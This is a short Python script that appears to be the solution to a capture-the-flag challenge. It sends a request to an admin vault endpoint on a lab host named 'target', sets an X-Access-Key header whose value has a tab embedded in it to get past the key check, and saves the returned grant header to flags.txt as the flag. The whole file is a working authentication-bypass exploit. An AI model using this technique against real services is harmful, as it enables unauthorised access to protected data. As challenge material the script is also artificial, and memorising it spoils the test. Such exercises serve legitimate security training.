#!/usr/bin/env python3
from __future__ import annotations

import pathlib
import sys
import urllib.request


APP_DIR = pathlib.Path(sys.argv[1]) if len(sys.argv) > 1 else pathlib.Path("/app")


def main() -> int:
    url = "http://target:5000/api/vault/admin"
    req = urllib.request.Request(url)
    req.add_header("X-Access-Key", "master\tkey")
    with urllib.request.urlopen(req, timeout=30) as resp:
        flag = resp.headers.get("X-Vault-Grant")
        if not flag:
            raise SystemExit("no X-Vault-Grant header in response")
        (APP_DIR / "flags.txt").write_text(flag + "\n")
        print(flag)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
